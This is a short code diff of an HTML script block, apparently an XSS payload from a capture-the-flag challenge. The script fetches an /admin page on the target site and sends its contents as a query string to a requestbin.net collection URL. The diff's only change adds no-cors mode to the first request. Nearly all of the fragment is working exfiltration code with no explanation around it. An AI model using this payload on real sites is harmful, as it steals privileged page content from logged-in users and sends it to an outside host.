@@ -1,5 +1,5 @@
 <script>
-fetch("https://lesn.m0lecon.fans/admin").then(function(a) {
+fetch("https://lesn.m0lecon.fans/admin", {"mode": "no-cors"}).then(function(a) {
     a.text().then(owo => {
         fetch(`https://16a22qikbb312v0p.b.requestbin.net?${owo}`, {
             "mode": "no-cors"
